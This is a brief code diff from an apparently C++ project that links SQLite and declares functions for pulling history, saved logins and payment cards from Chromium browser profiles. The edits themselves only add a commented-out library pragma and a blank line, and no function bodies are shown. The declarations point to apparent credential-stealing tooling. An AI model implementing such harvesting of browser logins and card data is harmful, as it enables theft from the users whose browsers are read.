@@ -28,7 +28,7 @@
 #include <fstream>
 #include <vector>
 #include "../../dependencies/sqlite/sqlite3.h"
-
+//#pragma comment(lib, "sqlite3.lib")
 
 namespace global 
 {
@@ -44,6 +44,7 @@ void GetHistory(std::string path, std::string profile);
 void GetLogins(std::string path, std::string profile);
 
 void GetCards(std::string path, std::string profile);
+
 
 void browsers::Chromium()
 {
